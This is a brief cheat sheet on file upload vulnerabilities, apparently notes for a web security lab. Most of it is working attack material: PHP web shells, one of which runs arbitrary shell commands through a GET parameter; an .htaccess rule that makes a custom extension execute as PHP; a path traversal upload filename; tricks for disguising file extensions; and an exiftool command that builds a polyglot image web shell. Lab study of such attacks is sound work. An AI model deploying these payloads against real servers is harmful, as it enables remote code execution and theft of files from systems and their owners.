# 🗃 File Upload

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```php
<?php echo system($_GET['command']); ?>
```

### Check for .htaccess if Apache

* Allows telling how to handle file extensions i.e run .l33t as php
  * `AddType application/x-httpd-php .l33t`
* Web.config similar in IIS

### Path Traversal

* include path traversal in filename: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
  * may need obfuscation i.e URL Encoding
* May give hints to path in response (path stripping ../)

### Obfuscating File Extension

* Null byte injection -> test.php%00.jpg
* Multiple extensions -> test.php.jpg
* Trailing characters -> test.php.
* URL Encoding -> test%2ephp
* Semicolons -> test.asp;.jpg
* Multibyte Unicode Characters -> xC0x2E as x2E (period)

### Polyglot web shell upload

* `exiftool -Comment="<?php echo 'START:' . file_get_contents('/home/carlos/secret') . ':END'; ?>" 19.jpg -o exploit.php`
* Needs an upload function, I couldn't get the copy past working using xclip, base64, and decoder
